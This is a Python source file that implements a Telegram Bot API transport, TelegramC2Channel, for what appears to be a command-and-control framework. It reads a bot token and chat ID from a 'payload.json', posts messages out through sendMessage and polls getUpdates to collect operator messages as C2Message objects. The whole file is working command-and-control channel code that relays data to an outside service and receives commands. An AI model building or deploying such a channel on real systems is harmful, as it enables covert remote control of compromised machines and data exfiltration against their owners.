"""Telegram channel adapter (Bot API over plain HTTPS).

Credentials: ``telegram_token`` plus ``telegram_chat_id`` from
``payload.json``. Polling uses ``getUpdates`` with an in-memory offset
cursor, so no bot framework dependency is required.
"""

from __future__ import annotations

import requests

from core.protocols import C2Message
from modules.c2_channels.base import HttpC2Channel

API_BASE = "https://api.telegram.org"


class TelegramC2Channel(HttpC2Channel):
    """Telegram Bot API transport (send + getUpdates polling)."""

    name = "telegram"

    def __init__(self, config: dict) -> None:
        self._token = ""
        self._chat_id = ""
        self._update_offset = 0
        super().__init__(config)

    def _resolve_credentials(self) -> bool:
        self._token = str(self._config.get("telegram_token", "") or "").strip()
        self._chat_id = str(self._config.get("telegram_chat_id", "") or "").strip()
        return bool(self._token) and bool(self._chat_id)

    def _send_request(self, text: str) -> requests.Response:
        return requests.post(  # noqa: S113
            f"{API_BASE}/bot{self._token}/sendMessage",
            json={"chat_id": self._chat_id, "text": text, "disable_web_page_preview": True},
            timeout=10.0,
        )

    def _poll_request(self, limit: int) -> list[C2Message]:
        response = requests.get(  # noqa: S113
            f"{API_BASE}/bot{self._token}/getUpdates",
            params={
                "offset": self._update_offset + 1,
                "limit": limit,
                "allowed_updates": ["message"],
                "timeout": 0,
            },
            timeout=15.0,
        )
        body = response.json()
        updates = body.get("result", []) if isinstance(body, dict) else []
        messages: list[C2Message] = []
        for update in updates:
            update_id = int(update.get("update_id", 0))
            if update_id > self._update_offset:
                self._update_offset = update_id
            message = update.get("message") or {}
            text = str(message.get("text", "") or "")
            sender = str((message.get("from") or {}).get("id", "") or "")
            if text and sender:
                messages.append(C2Message(channel=self.name, sender=sender, text=text))
        return messages
